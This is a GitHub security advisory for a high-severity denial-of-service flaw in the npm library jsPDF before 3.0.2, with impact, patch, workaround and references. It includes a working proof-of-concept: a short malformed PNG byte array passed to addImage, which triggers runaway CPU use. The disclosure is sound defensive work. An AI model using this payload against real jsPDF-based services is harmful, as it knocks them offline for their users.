# [H] jsPDF Denial of Service (DoS)

## Summary
Severity: High
Advisory: GHSA-8mvj-3j78-4qmw
CVE: CVE-2025-57810
CWE: CWE-20, CWE-835
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2025-08-26
Source: https://github.com/advisories/GHSA-8mvj-3j78-4qmw
Type: github-advisory

## Affected
- npm: `jspdf` — affected >=0 <3.0.2

## Details
### Impact
User control of the first argument of the addImage method results in CPU utilization and denial of service.

If given the possibility to pass unsanitized image data or URLs to the addImage method, a user can provide a harmful PNG file that results in high CPU utilization and denial of service.

Other affected methods are: `html`.

Example payload:

```js
import { jsPDF } from "jspdf" 

const payload = new Uint8Array([117, 171, 90, 253, 166, 154, 105, 166, 154])

const doc = new jsPDF();
const startTime = performance.now();
try {
  doc.addImage(payload, "PNG", 10, 40, 180, 180, undefined, "SLOW");
} finally {
  const endTime = performance.now();
  console.log(`Call to doc.addImage took ${endTime - startTime} milliseconds`);
}
```

### Patches
The vulnerability was fixed in jsPDF 3.0.2. Upgrade to jspdf@>=3.0.2.

In jspdf@>=3.0.2, invalid PNG files throw an Error instead of causing very long running loops.

### Workarounds
Sanitize image data or URLs before passing it to the addImage method or one of the other affected methods.

### Credits
Researcher: Aleksey Solovev (Positive Technologies)

## References
- https://github.com/parallax/jsPDF/security/advisories/GHSA-8mvj-3j78-4qmw
- https://nvd.nist.gov/vuln/detail/CVE-2025-57810
- https://github.com/parallax/jsPDF/pull/3880
- https://github.com/parallax/jsPDF/commit/4cf3ab619e565d9b88b4b130bff901b91d8688e9
- https://github.com/parallax/jsPDF
- https://github.com/parallax/jsPDF/releases/tag/v3.0.2
